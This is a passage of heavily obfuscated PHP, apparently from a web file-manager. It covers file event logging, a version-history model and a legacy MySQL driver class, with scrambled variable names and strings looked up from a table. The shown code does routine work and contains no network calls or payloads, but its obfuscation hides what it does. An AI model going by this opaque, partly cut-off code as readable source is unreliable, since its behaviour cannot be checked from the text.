($ĞÓÙ±ìÜ && is_string($ĞÓÙ±ìÜ)) { $ĞÓÙ±ìÜ = array($Æõ©ëù´[2160] => $ĞÓÙ±ìÜ); } $·™æèü = KodUser::id(); $ß­•›²¥ = array($Æõ©ëù´[502] => $µ¦ë§Ò’, $Æõ©ëù´[2351] => $§Ìã÷[$Æõ©ëù´[191]], $Æõ©ëù´[2352] => $§Ìã÷[$Æõ©ëù´[32]], $Æõ©ëù´[598] => !empty($§Ìã÷[$Æõ©ëù´[598]]) ? $§Ìã÷[$Æõ©ëù´[598]] : $Æõ©ëù´[12], $Æõ©ëù´[1907] => $·™æèü, $Æõ©ëù´[507] => $Úùª¥€ª, $Æõ©ëù´[1909] => $ĞÓÙ±ìÜ); $this->addSystemLog($Úùª¥€ª, $ß­•›²¥); unset($ß­•›²¥[$Æõ©ëù´[2352]], $ß­•›²¥[$Æõ©ëù´[598]]); return $this->add($ß­•›²¥); } private function addSystemLog($Êªâô–Ô, $ÚÁ´¹¬–) { $ôå±øÉ† =& $_SERVER[¿ÈˆÑ¸ä]; if ($Êªâô–Ô == $ôå±øÉ†[2353]) { $Êªâô–Ô = $ÚÁ´¹¬–[$ôå±øÉ†[536]][$ôå±øÉ†[2354]]; } else { if (in_array($Êªâô–Ô, array($ôå±øÉ†[1499], $ôå±øÉ†[2355]))) { $Êªâô–Ô = $ÚÁ´¹¬–[$ôå±øÉ†[536]][$ôå±øÉ†[169]]; } } $¤¯’æ¬ë = array_merge($ÚÁ´¹¬–, array($ôå±øÉ†[2356] => $ÚÁ´¹¬–[$ôå±øÉ†[192]], $ôå±øÉ†[2357] => $ÚÁ´¹¬–[$ôå±øÉ†[2357]])); Hook::trigger($ôå±øÉ†[2358], $ôå±øÉ†[2359] . $Êªâô–Ô, $ÚÁ´¹¬–); Model($ôå±øÉ†[2069])->addLog($ôå±øÉ†[2359] . $Êªâô–Ô, $¤¯’æ¬ë); } private function isDisableEvent($¨”£êª¸, $ÖĞŠÇ»Í) { $µÊöµ¡û =& $_SERVER[¿ÈˆÑ¸ä]; if ($¨”£êª¸[$µÊöµ¡û[189]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($ÖĞŠÇ»Í == $µÊöµ¡û[1267]) { return !1; } return !0; } public function eventCreate($íµˆıìó, $ÃÕªüš») { $òûÌåïõ =& $_SERVER[¿ÈˆÑ¸ä]; $Â­Ù¨Ï½ = Model($òûÌåïõ[1469])->sourceInfo($íµˆıìó); $ÚÚ“Ù·Ê = array($òûÌåïõ[2354] => $ÃÕªüš», $òûÌåïõ[32] => $Â­Ù¨Ï½[$òûÌåïõ[32]]); return $this->addEvent($íµˆıìó, $òûÌåïõ[2353], $ÚÚ“Ù·Ê); } public function eventFileEdit($³åÙÙ­¶) { $˜¢‘ßÌ =& $_SERVER[¿ÈˆÑ¸ä]; $¾Ñõ¿™Ç = array($˜¢‘ßÌ[2360] => $_SERVER[$˜¢‘ßÌ[2361]], $˜¢‘ßÌ[2362] => strtolower(ACTION)); if (isset($GLOBALS[$˜¢‘ßÌ[7]][$˜¢‘ßÌ[1559]])) { $¾Ñõ¿™Ç[$˜¢‘ßÌ[1559]] = $˜¢‘ßÌ[91]; } return $this->addEvent($³åÙÙ­¶, $˜¢‘ßÌ[1498], $¾Ñõ¿™Ç); } public function eventRecycle($öÚæó¾Æ, $ìğ«óŞ‘) { return $this->addEvent($öÚæó¾Æ, $_SERVER[¿ÈˆÑ¸ä][2355], $ìğ«óŞ‘); } private static $_removeLast = ''; public function eventRemove($ïğÜ›ÒŞ) { $ø›Õğ­¨ =& $_SERVER[¿ÈˆÑ¸ä]; self::$_removeLast = $ïğÜ›ÒŞ; $’Ä¼” = Model($ø›Õğ­¨[1469])->sourceInfo($ïğÜ›ÒŞ); $‹Œ®±ß· = array_field_key($’Ä¼”, array($ø›Õğ­¨[192], $ø›Õğ­¨[553], $ø›Õğ­¨[516], $ø›Õğ­¨[600])); $‹¯íšÊÑ = array($ø›Õğ­¨[169] => $’Ä¼”[$ø›Õğ­¨[32]], $ø›Õğ­¨[2362] => ACTION, $ø›Õğ­¨[2363] => $‹Œ®±ß·); return $this->addEvent($’Ä¼”[$ø›Õğ­¨[191]], $ø›Õğ­¨[1267], $‹¯íšÊÑ); } public function eventShare($àØâàÕ, $½Îİç€¬) { return $this->addEvent($àØâàÕ, $_SERVER[¿ÈˆÑ¸ä][1499], $½Îİç€¬); } public function eventMove($§ë¶è…, $İæµñÀÆ, $æÏñø³ï) { $Èšñ”Ùè =& $_SERVER[¿ÈˆÑ¸ä]; if (self::$_removeLast == $§ë¶è…) { return; } $ª‚­Çë¯ = Model($Èšñ”Ùè[1469]); $±ªÃœ­Î = $ª‚­Çë¯->sourceInfo($§ë¶è…); $”‚Åö¸ì = $ª‚­Çë¯->sourceInfo($İæµñÀÆ); $´ âÒÒ = $ª‚­Çë¯->sourceInfo($æÏñø³ï); $Ÿ€ïæ‹Ã = array($Èšñ”Ùè[1279] => $İæµñÀÆ, $Èšñ”Ùè[2364] => $”‚Åö¸ì[$Èšñ”Ùè[32]], $Èšñ”Ùè[2322] => !empty($”‚Åö¸ì[$Èšñ”Ùè[598]]) ? $”‚Åö¸ì[$Èšñ”Ùè[598]] : $Èšñ”Ùè[12], $Èšñ”Ùè[1280] => $æÏñø³ï, $Èšñ”Ùè[2365] => $´ âÒÒ[$Èšñ”Ùè[32]], $Èšñ”Ùè[2366] => !empty($´ âÒÒ[$Èšñ”Ùè[598]]) ? $´ âÒÒ[$Èšñ”Ùè[598]] : $Èšñ”Ùè[12]); $this->addEvent($§ë¶è…, $Èšñ”Ùè[639], $Ÿ€ïæ‹Ã); $±ªÃœ­Î = $ª‚­Çë¯->sourceInfo($§ë¶è…); $Ÿ€ïæ‹Ã = array($Èšñ”Ùè[192] => $±ªÃœ­Î[$Èšñ”Ùè[192]], $Èšñ”Ùè[32] => $±ªÃœ­Î[$Èšñ”Ùè[32]]); $this->addEvent($İæµñÀÆ, $Èšñ”Ùè[2367], $Ÿ€ïæ‹Ã); } public function eventCopy($¡ºÌƒ§×) { $this->eventCreate($¡ºÌƒ§×, $_SERVER[¿ÈˆÑ¸ä][637]); } public function eventRename($¦¦ÎôÊŞ, $»×»Ñì, $¦äâÈ¸Å) { $¹·˜ü¾ =& $_SERVER[¿ÈˆÑ¸ä]; $¦ï°°† = array($¹·˜ü¾[1279] => $»×»Ñì, $¹·˜ü¾[1280] => $¦äâÈ¸Å); return $this->addEvent($¦¦ÎôÊŞ, $¹·˜ü¾[1483], $¦ï°°†); } public function eventAddComment($İëğÅ, $×Ì¨üœ®) { return $this->addEvent($İëğÅ, $_SERVER[¿ÈˆÑ¸ä][2368], $×Ì¨üœ®); } public function eventAddDesc($‹åœøÆÆ, $¿ˆòãŞğ) { return $this->addEvent($‹åœøÆÆ, $_SERVER[¿ÈˆÑ¸ä][2369], $¿ˆòãŞğ); } public function listBySource($·‘¦¾Ã¿) { $¶Šæ±ÃÙ =& $_SERVER[¿ÈˆÑ¸ä]; $ƒ±Ç«±é = Model($¶Šæ±ÃÙ[1469])->sourceInfo($·‘¦¾Ã¿); $šº¼è™ = array($¶Šæ±ÃÙ[502] => $·‘¦¾Ã¿); if ($ƒ±Ç«±é[$¶Šæ±ÃÙ[496]] == $¶Šæ±ÃÙ[91]) { $Óº”™Ùö = Model($¶Šæ±ÃÙ[1469])->listSearchChildren($·‘¦¾Ã¿, 20000); $Óº”™Ùö[] = $·‘¦¾Ã¿ . $¶Šæ±ÃÙ[463]; $šº¼è™ = array($¶Šæ±ÃÙ[192] => array($¶Šæ±ÃÙ[7], $Óº”™Ùö)); } $ä¾ÔĞ³ = $this->where($šº¼è™)->order($¶Šæ±ÃÙ[2370])->selectPage(); if ($ä¾ÔĞ³[$¶Šæ±ÃÙ[443]][$¶Šæ±ÃÙ[444]] == 0) { $ä¾ÔĞ³[$¶Šæ±ÃÙ[443]][$¶Šæ±ÃÙ[444]] = 1; $ä¾ÔĞ³[$¶Šæ±ÃÙ[446]] = array(array($¶Šæ±ÃÙ[502] => $·‘¦¾Ã¿, $¶Šæ±ÃÙ[2351] => $ƒ±Ç«±é[$¶Šæ±ÃÙ[191]], $¶Šæ±ÃÙ[1907] => $ƒ±Ç«±é[$¶Šæ±ÃÙ[537]], $¶Šæ±ÃÙ[507] => $¶Šæ±ÃÙ[2371], $¶Šæ±ÃÙ[508] => $ƒ±Ç«±é[$¶Šæ±ÃÙ[232]], $¶Šæ±ÃÙ[1909] => $¶Šæ±ÃÙ[12])); } return $this->eventListParse($ä¾ÔĞ³, $·‘¦¾Ã¿); } private function eventListParse($ØôĞè¥¿, $ş¬®—üä) { $áèÇø¹ =& $_SERVER[¿ÈˆÑ¸ä]; $¥·»‡—’ = $ØôĞè¥¿[$áèÇø¹[446]]; $¢Ú·Çß‰ = array_to_keyvalue($¥·»‡—’, $áèÇø¹[12], $áèÇø¹[192]); $ôƒ¤ïÊ = array_to_keyvalue($¥·»‡—’, $áèÇø¹[12], $áèÇø¹[2357]); foreach ($¥·»‡—’ as $ºš«™™¯) { $Ğƒé­ï¾ = $ºš«™™¯[$áèÇø¹[536]]; if ($ºš«™™¯[$áèÇø¹[33]] == $áèÇø¹[639] && isset($Ğƒé­ï¾[$áèÇø¹[1279]])) { $¢Ú·Çß‰[] = $Ğƒé­ï¾[$áèÇø¹[1279]] . $áèÇø¹[12]; $¢Ú·Çß‰[] = $Ğƒé­ï¾[$áèÇø¹[1280]] . $áèÇø¹[12]; } if ($ºš«™™¯[$áèÇø¹[33]] == $áèÇø¹[2367] && isset($Ğƒé­ï¾[$áèÇø¹[192]])) { $¢Ú·Çß‰[] = $Ğƒé­ï¾[$áèÇø¹[192]] . $áèÇø¹[12]; } } $¢Ú·Çß‰ = array_merge($¢Ú·Çß‰, $ôƒ¤ïÊ, array($ş¬®—üä . $áèÇø¹[12])); $¢Ú·Çß‰ = array_unique($¢Ú·Çß‰); $Úäªåéî = array_unique(array_to_keyvalue($¥·»‡—’, $áèÇø¹[12], $áèÇø¹[1529])); $÷ˆÚøî = Model($áèÇø¹[613])->userListInfo($Úäªåéî); $æ†µŠÆ” = Model($áèÇø¹[916])->sourceListInfo($¢Ú·Çß‰, !0); foreach ($¥·»‡—’ as &$ºš«™™¯) { if ($ºš«™™¯[$áèÇø¹[33]] == $áèÇø¹[639] && isset($ºš«™™¯[$áèÇø¹[536]][$áèÇø¹[1279]])) { $ºš«™™¯[$áèÇø¹[536]][$áèÇø¹[1279]] = $æ†µŠÆ”[$ºš«™™¯[$áèÇø¹[536]][$áèÇø¹[1279]]]; $ºš«™™¯[$áèÇø¹[536]][$áèÇø¹[1280]] = $æ†µŠÆ”[$ºš«™™¯[$áèÇø¹[536]][$áèÇø¹[1280]]]; } if ($ºš«™™¯[$áèÇø¹[33]] == $áèÇø¹[2367] && isset($ºš«™™¯[$áèÇø¹[536]][$áèÇø¹[192]])) { $ºš«™™¯[$áèÇø¹[536]][$áèÇø¹[192]] = $æ†µŠÆ”[$ºš«™™¯[$áèÇø¹[536]][$áèÇø¹[192]]]; } $ºš«™™¯[$áèÇø¹[90]] = $æ†µŠÆ”[$ºš«™™¯[$áèÇø¹[192]]]; $ºš«™™¯[$áèÇø¹[2372]] = $æ†µŠÆ”[$ºš«™™¯[$áèÇø¹[2357]]]; if ($ºš«™™¯[$áèÇø¹[33]] == $áèÇø¹[1267]) { $ºš«™™¯[$áèÇø¹[2372]] = $ºš«™™¯[$áèÇø¹[90]]; $ºš«™™¯[$áèÇø¹[2357]] = $ºš«™™¯[$áèÇø¹[2372]][$áèÇø¹[192]]; $ºš«™™¯[$áèÇø¹[90]] = !1; $ºš«™™¯[$áèÇø¹[192]] = $áèÇø¹[12]; } $ºš«™™¯[$áèÇø¹[2296]] = $÷ˆÚøî[$ºš«™™¯[$áèÇø¹[1529]]]; } unset($ºš«™™¯); $ØôĞè¥¿[$áèÇø¹[446]] = $¥·»‡—’; return $ØôĞè¥¿; } public function removeBySource($ŒÓ°µÍ¤) { $íâ·É²” = array($_SERVER[¿ÈˆÑ¸ä][502] => $ŒÓ°µÍ¤); $this->where($íâ·É²”)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\165\x72\143\145\137\x68\x69\163\164\157\x72\x79"; public function historyCount($ÚÅ¥†ğ‚) { $‰ÖÂº¤£ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ÚÅ¥†ğ‚) { return array(); } if (is_string($ÚÅ¥†ğ‚) || is_int($ÚÅ¥†ğ‚)) { $ÚÅ¥†ğ‚ = array($ÚÅ¥†ğ‚); } $óÛğó¢° = array($‰ÖÂº¤£[192], $‰ÖÂº¤£[2373] => $‰ÖÂº¤£[581]); $İ®¿á¯ü = array($‰ÖÂº¤£[192] => array($‰ÖÂº¤£[7], $ÚÅ¥†ğ‚)); $÷ÅæáÜÄ = $this->field($óÛğó¢°)->where($İ®¿á¯ü)->group($‰ÖÂº¤£[192])->select(); return array_to_keyvalue($÷ÅæáÜÄ, $‰ÖÂº¤£[192], $‰ÖÂº¤£[581]); } public function addHistory($—¯›ÕÃŞ, $áÒîğî = '') { $Éµà‰Úõ =& $_SERVER[¿ÈˆÑ¸ä]; $Ã¦å¬ = array($Éµà‰Úõ[502] => $—¯›ÕÃŞ[$Éµà‰Úõ[192]], $Éµà‰Úõ[1907] => isset($—¯›ÕÃŞ[$Éµà‰Úõ[539]]) ? $—¯›ÕÃŞ[$Éµà‰Úõ[539]] : $—¯›ÕÃŞ[$Éµà‰Úõ[537]], $Éµà‰Úõ[554] => $—¯›ÕÃŞ[$Éµà‰Úõ[553]], $Éµà‰Úõ[636] => $—¯›ÕÃŞ[$Éµà‰Úõ[79]], $Éµà‰Úõ[2374] => $áÒîğî); if ($GLOBALS[$Éµà‰Úõ[6]][$Éµà‰Úõ[92]][$Éµà‰Úõ[1341]] >= 1) { $this->historyAutoClear($Ã¦å¬[$Éµà‰Úõ[192]]); $this->add($Ã¦å¬); } Hook::trigger($Éµà‰Úõ[2375], $Ã¦å¬); Model($Éµà‰Úõ[2376])->eventFileEdit($—¯›ÕÃŞ[$Éµà‰Úõ[192]]); } private function historyAutoClear($˜Ñ•ŸÜ) { $ÃÇÈÕÖ„ =& $_SERVER[¿ÈˆÑ¸ä]; $²«‰Íõõ = Model($ÃÇÈÕÖ„[856])->get($ÃÇÈÕÖ„[1363]); $ë€¨Œ = intval($GLOBALS[$ÃÇÈÕÖ„[6]][$ÃÇÈÕÖ„[92]][$ÃÇÈÕÖ„[1341]]); $ØÀ¬ö¥« = $²«‰Íõõ == $ÃÇÈÕÖ„[1364] ? min(5, $ë€¨Œ) : $ë€¨Œ; $ØÀ¬ö¥« = $ØÀ¬ö¥« <= 0 ? 0 : $ØÀ¬ö¥« - 1; if ($ØÀ¬ö¥« >= 499) { return; } $ùÅ¥¢›´ = array($ÃÇÈÕÖ„[502] => $˜Ñ•ŸÜ); $äàèÏ¯Á = $this->field($ÃÇÈÕÖ„[2377])->where($ùÅ¥¢›´)->order($ÃÇÈÕÖ„[2370])->select(); if (!$äàèÏ¯Á || $ØÀ¬ö¥« >= count($äàèÏ¯Á)) { return; } $Ñ¥åÅø‘ = array_to_keyvalue($äàèÏ¯Á, $ÃÇÈÕÖ„[12], $ÃÇÈÕÖ„[483]); $Ñ¥åÅø‘ = array_slice($Ñ¥åÅø‘, $ØÀ¬ö¥«); $Ó öÊô = array_to_keyvalue($äàèÏ¯Á, $ÃÇÈÕÖ„[12], $ÃÇÈÕÖ„[553]); $Ó öÊô = array_slice($Ó öÊô, $ØÀ¬ö¥«); if (!$Ñ¥åÅø‘ || !$Ó öÊô) { return; } $ùÅ¥¢›´ = array($ÃÇÈÕÖ„[504] => array($ÃÇÈÕÖ„[7], $Ñ¥åÅø‘)); $this->where($ùÅ¥¢›´)->delete(); Model($ÃÇÈÕÖ„[556])->remove($Ó öÊô); } public function listData($Ş€ú¥°Û) { $’·Êü®• =& $_SERVER[¿ÈˆÑ¸ä]; $ ™‰µö = array($’·Êü®•[502] => $Ş€ú¥°Û); $›—µğÔò = $’·Êü®•[2378]; $Îç»Åˆ¥ = $this->field($›—µğÔò)->where($ ™‰µö)->order($’·Êü®•[2370])->selectPage(); $this->_listAppendUser($Îç»Åˆ¥[$’·Êü®•[446]]); $â÷Ş“„¥ = Model($’·Êü®•[856])->get($’·Êü®•[1363]); $¦ÛçââØ = 5; if ($â÷Ş“„¥ == $’·Êü®•[1364]) { $Îç»Åˆ¥[$’·Êü®•[446]] = array_slice($Îç»Åˆ¥[$’·Êü®•[446]], 0, $¦ÛçââØ); $Îç»Åˆ¥[$’·Êü®•[443]] = array($’·Êü®•[2379] => 1, $’·Êü®•[2380] => 20, $’·Êü®•[2381] => 1, $’·Êü®•[2382] => count($Îç»Åˆ¥[$’·Êü®•[446]])); } return $Îç»Åˆ¥; } protected function _listAppendUser(&$Íƒ˜û·) { $®›ü–¬ =& $_SERVER[¿ÈˆÑ¸ä]; $—­çŠú = array_to_keyvalue($Íƒ˜û·, $®›ü–¬[12], $®›ü–¬[1529]); $áÚş…ÀÄ = Model($®›ü–¬[613])->userListInfo($—­çŠú); foreach ($Íƒ˜û· as &$ñ›À”Ş) { $¿Û«´Ÿñ = $ñ›À”Ş[$®›ü–¬[1529]]; $ñ›À”Ş[$®›ü–¬[537]] = $áÚş…ÀÄ[$¿Û«´Ÿñ] ? $áÚş…ÀÄ[$¿Û«´Ÿñ] : !1; } unset($ñ›À”Ş); } public function fileInfo($Ü£âÔèÍ, $€Ï¼Š = false) { $ÙÊœŠì‘ =& $_SERVER[¿ÈˆÑ¸ä]; $ÜÏ˜¸îŒ = $this->tablePrefix; $”””£šâ = "{$ÜÏ˜¸îŒ}\151\x6f\x5f\x66\x69\154\145\x20\146\151\x6c\x65\163\x20\157\x6e\40\146\x69\154\x65\163\x2e\146\151\x6c\145\x49\x44\40\75\x20\x68\x69\163\164\x6f\162\171\56\x66\151\154\145\111\104"; $ÑÉ¾ÄÃä = $this->alias($ÙÊœŠì‘[2383])->where(array($ÙÊœŠì‘[504] => $Ü£âÔèÍ))->join($”””£šâ, $ÙÊœŠì‘[2384])->find(); if ($ÑÉ¾ÄÃä && $€Ï¼Š) { $ğğÏÉÜ… = array($ÙÊœŠì‘[192] => $ÑÉ¾ÄÃä[$ÙÊœŠì‘[192]], $ÙÊœŠì‘[483] => array($ÙÊœŠì‘[1116], $Ü£âÔèÍ)); $ÑÉ¾ÄÃä[$ÙÊœŠì‘[1801]] = $this->where($ğğÏÉÜ…)->count(); } return $ÑÉ¾ÄÃä; } public function removeItem($ÕÅç©«Ü) { $»­ÜÜ˜… =& $_SERVER[¿ÈˆÑ¸ä]; $†­ÖØ¨ = array($»­ÜÜ˜…[504] => $ÕÅç©«Ü); $¤¥¥ô… = $this->where($†­ÖØ¨)->find(); if ($¤¥¥ô…) { $¯“ëÂ = $this->where($†­ÖØ¨)->delete(); Model($»­ÜÜ˜…[556])->remove($¤¥¥ô…[$»­ÜÜ˜…[553]]); return $¯“ëÂ; } return !1; } public function removeBySource($ş¨üòÍî) { $Èê˜ ûæ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ş¨üòÍî) { return !1; } if (!is_array($ş¨üòÍî)) { $ş¨üòÍî = array($ş¨üòÍî); } $á©Ûˆ¡ = array($Èê˜ ûæ[502] => array($Èê˜ ûæ[7], $ş¨üòÍî)); $îûİÙÄ× = $this->field($Èê˜ ûæ[554])->where($á©Ûˆ¡)->select(); if ($îûİÙÄ×) { $this->where($á©Ûˆ¡)->delete(); $›—›—ü = array_to_keyvalue($îûİÙÄ×, $Èê˜ ûæ[12], $Èê˜ ûæ[553]); Model($Èê˜ ûæ[556])->remove($›—›—ü); } return !0; } public function setDetail($ÎË•ê, $€‘–ƒßó) { $§¶¦ïÂû =& $_SERVER[¿ÈˆÑ¸ä]; return $this->where(array($§¶¦ïÂû[504] => $ÎË•ê))->save(array($§¶¦ïÂû[2374] => $€‘–ƒßó)); } public function rollbackToItem($Ò”í…üª, $á»×»°Œ) { $âû¾ªİÚ =& $_SERVER[¿ÈˆÑ¸ä]; $¡ü£ßª = Model($âû¾ªİÚ[916])->sourceInfo($Ò”í…üª); $this->addHistory($¡ü£ßª, LNG($âû¾ªİÚ[2385])); $ªâĞÄî‰ = $this->find($á»×»°Œ); $ñœ«Õ = array($âû¾ªİÚ[553] => $ªâĞÄî‰[$âû¾ªİÚ[553]], $âû¾ªİÚ[79] => $ªâĞÄî‰[$âû¾ªİÚ[79]], $âû¾ªİÚ[88] => time(), $âû¾ªİÚ[539] => USER_ID); Model($âû¾ªİÚ[916])->where(array($âû¾ªİÚ[192] => $Ò”í…üª))->save($ñœ«Õ); return $this->where(array($âû¾ªİÚ[504] => $á»×»°Œ))->delete(); } public function clearSame($¶‚ƒÊÅÖ) { $¤’èŞ«° =& $_SERVER[¿ÈˆÑ¸ä]; $òôìÉ = $this->listData($¶‚ƒÊÅÖ); $×°œ”ñù = array_to_keyvalue_group($òôìÉ, $¤’èŞ«°[553]); $¿½¦© = array(); $Î¹àŠó = array(); foreach ($×°œ”ñù as $º†Ğ§ş) { if (!$º†Ğ§ş || count($º†Ğ§ş) <= 1) { continue; } foreach ($º†Ğ§ş as $Ô‰»Ëœ ) { $¿½¦©[] = $Ô‰»Ëœ [$¤’èŞ«°[553]]; $Î¹àŠó[] = $Ô‰»Ëœ [$¤’èŞ«°[483]]; } } if (!$Î¹àŠó) { return; } $this->where(array($¤’èŞ«°[483] => array($¤’èŞ«°[7], $Î¹àŠó)))->delete(); Model($¤’èŞ«°[556])->remove($¿½¦©); } public function userSpace() { $¥˜Öó’ =& $_SERVER[¿ÈˆÑ¸ä]; $Ò££şà = $this->tablePrefix; $¬×™î³š = array($¥˜Öó’[1907] => USER_ID); $¥–­±Ë¶ = "{$Ò££şà}\x69\x6f\137\146\151\x6c\145\x20\x66\151\154\x65\x73\40\x6f\156\40\146\x69\154\145\163\56\x66\x69\154\x65\x49\104\x20\x3d\x20\x68\x69\163\164\x6f\x72\x79\x2e\146\151\x6c\x65\x49\x44"; return $this->alias($¥˜Öó’[2383])->where($¬×™î³š)->join($¥–­±Ë¶, $¥˜Öó’[2384])->sum($¥˜Öó’[79]); } } goto fïøÑïï†£; f¢›Á×òøô: class DbMysql extends Db { public function __construct($±Ï÷ñ‡› = '') { $å”®şÙ¨ =& $_SERVER[¿ÈˆÑ¸ä]; if (!extension_loaded($å”®şÙ¨[887])) { think_exception(think_lang($å”®şÙ¨[14]) . $å”®şÙ¨[985]); } if (!empty($±Ï÷ñ‡›)) { $this->config = $±Ï÷ñ‡›; if (empty($this->config[$å”®şÙ¨[17]])) { $this->config[$å”®şÙ¨[17]] = $å”®şÙ¨[12]; } } } public function connect($®ñäüÄì = '', $÷¯ˆ†úü = 0, $ĞĞ¿Î†ø = false) { $“˜ú®ˆ© =& $_SERVER[¿ÈˆÑ¸ä]; if (!isset($this->linkID[$÷¯ˆ†úü])) { if (empty($®ñäüÄì)) { $®ñäüÄì = $this->config; } $ıÜ…º¼Ÿ = $®ñäüÄì[$“˜ú®ˆ©[986]] . ($®ñäüÄì[$“˜ú®ˆ©[987]] ? "\72{$®ñäüÄì[$“˜ú®ˆ©[987]]}" : $“˜ú®ˆ©[12]); $ ™ı“ïı = !empty($®ñäüÄì[$“˜ú®ˆ©[17]][$“˜ú®ˆ©[18]]) ? $®ñäüÄì[$“˜ú®ˆ©[17]][$“˜ú®ˆ©[18]] : $this->pconnect; if ($ ™ı“ïı) { $this->linkID[$÷¯ˆ†úü] = mysql_pconnect($ıÜ…º¼Ÿ, $®ñäüÄì[$“˜ú®ˆ©[988]], $®ñäüÄì[$“˜ú®ˆ©[989]], 131072); } else { $this->linkID[$÷¯ˆ†úü] = mysql_connect($ıÜ…º¼Ÿ, $®ñäüÄì[$“˜ú®ˆ©[988]], $®ñäüÄì[$“˜ú®ˆ©[989]], !0, 131072); } if (!$this->linkID[$÷¯ˆ†úü] || !empty($®ñäüÄì[$“˜ú®ˆ©[21]]) && !mysql_select_db($®ñäüÄì[$“˜ú®ˆ©[21]], $this->linkID[$÷¯ˆ†úü])) { think_exception(mysql_error()); } $‘ÃèŞ˜Š = mysql_get_server_info($this->linkID[$÷¯ˆ†úü]); mysql_query($“˜ú®ˆ©[990] . think_config($“˜ú®ˆ©[991]) . $“˜ú®ˆ©[58], $this->linkID[$÷¯ˆ†úü]); if ($‘ÃèŞ˜Š > $“˜ú®ˆ©[992]) { mysql_query($“˜ú®ˆ©[993], $this->linkID[$÷¯ˆ†úü]); } $this->connected = !0; if (1 != think_config($“˜ú®ˆ©[22])) { unset($this->config); } } return $this->linkID[$÷¯ˆ†úü]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($îŠœä€) { $á·—ä€• =& $_SERVER[¿ÈˆÑ¸ä]; if (0 === stripos($îŠœä€, $á·—ä€•[343])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $îŠœä€; if ($this->queryID) { $this->free(); } think_action_status($á·—ä€•[23], 1); think_status($á·—ä€•[24]); $this->queryID = mysql_query($îŠœä€, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($³ìçí™ı) { $Å½‡íã§ =& $_SERVER[¿ÈˆÑ¸ä]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $³ìçí™ı; if ($this->queryID) { $this->free(); } think_action_status($Å½‡íã§[25], 1); think_status($Å½‡íã§[24]); $šØÕõ’É = mysql_query($³ìçí™ı, $this->_linkID); $this->debug(); if (!1 === $šØÕõ’É) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¿ÈˆÑ¸ä][994], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ó›ƒğ‰ë = mysql_query($_SERVER[¿ÈˆÑ¸ä][995], $this->_linkID); $this->transTimes = 0; if (!$Ó›ƒğ‰ë) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $‚¨·šİ‚ = mysql_query($_SERVER[¿ÈˆÑ¸ä][996], $this->_linkID); $this->transTimes = 0; if (!$‚¨·šİ‚) { $this->error(); return !1; } } return !0; } private function getAll() { $ÄÆş›ŒÖ = array(); if ($this->numRows > 0) { while ($Ú‘âˆœğ = mysql_fetch_assoc($this->queryID)) { $ÄÆş›ŒÖ[] = $Ú‘âˆœğ; } mysql_data_seek($this->queryID, 0); } return $ÄÆş›ŒÖ; } public function getFields($ÃŠÌİÇÌ) { $†¸İŒ¶¼ =& $_SERVER[¿ÈˆÑ¸ä]; $á×’¹´à = $this->query($†¸İŒ¶¼[997] . $this->parseKey($ÃŠÌİÇÌ)); $ŞÔé‘×á = array(); if ($á×’¹´à) { foreach ($á×’¹´à as $ê³ÚéØ˜ => $ìÕ˜Ÿª½) { $ŞÔé‘×á[$ìÕ˜Ÿª½[$†¸İŒ¶¼[31]]] = array($†¸İŒ¶¼[32] => $ìÕ˜Ÿª½[$†¸İŒ¶¼[31]], $†¸İŒ¶¼[33] => $ìÕ˜Ÿª½[$†¸İŒ¶¼[34]], $†¸İŒ¶¼[35] => (bool) (strtoupper($ìÕ˜Ÿª½[$†¸İŒ¶¼[36]]) === $†¸İŒ¶¼[998]), $†¸İŒ¶¼[37] => $ìÕ˜Ÿª½[$†¸İŒ¶¼[38]], $†¸İŒ¶¼[39] => strtolower($ìÕ˜Ÿª½[$†¸İŒ¶¼[40]]) == $†¸İŒ¶¼[41], $†¸İŒ¶¼[42] => strtolower($ìÕ˜Ÿª½[$†¸İŒ¶¼[43]]) == $†¸İŒ¶¼[44]); } } return $ŞÔé‘×á; } public function getTables($íËé¤«Ü = '') { $Ú±Ğ¤û =& $_SERVER[¿ÈˆÑ¸ä]; if (!empty($íËé¤«Ü)) { $Çã¡ˆáÊ = $Ú±Ğ¤û[999] . $íËé¤«Ü . $Ú±Ğ¤û[1000]; } else { $Çã¡ˆáÊ = $Ú±Ğ¤û[1001]; } $Äìôşíí = $this->query($Çã¡ˆáÊ); $ ‘õ²İ³ = array(); foreach ($Äìôşíí as $¬ÉÌ™ä => $Êßƒª¹ß) { $ ‘õ²İ³[$¬ÉÌ™ä] = current($Êßƒª¹ß); } return $ ‘õ²İ³; } public function replace($ÉÇ¿ø‘, $…ÈÛ¤©Ë = array()) { $˜¸âµï† =& $_SERVER[¿ÈˆÑ¸ä]; foreach ($ÉÇ¿ø‘ as $ÚººÚé” => $»éÀÆÎ) { $‹ÂÁ€Æ = $this->parseValue($»éÀÆÎ); if (is_scalar($‹ÂÁ€Æ)) { $ÊŠéÙŞµ[] = $‹ÂÁ€Æ; $œíŸ±şÜ[] = $this->parseKey($ÚººÚé”); } } $Õˆ½éû„ = $˜¸âµï†[1002] . $this->parseTable($…ÈÛ¤©Ë[$˜¸âµï†[358]]) . $˜¸âµï†[1003] . implode($˜¸âµï†[50], $œíŸ±şÜ) . $˜¸âµï†[1004] . implode($˜¸âµï†[50], $ÊŠéÙŞµ) . $˜¸âµï†[1005]; return $this->execute($Õˆ½éû„); } public function insertAll($õ¯ËÂÎ¥, $†¢ÕÆ£ò = array(), $èÜåıÛ· = false) { $…‰ö«”¤ =& $_SERVER[¿ÈˆÑ¸ä]; if (!is_array($õ¯ËÂÎ¥[0])) { return !1; } $ğÀ³é· = 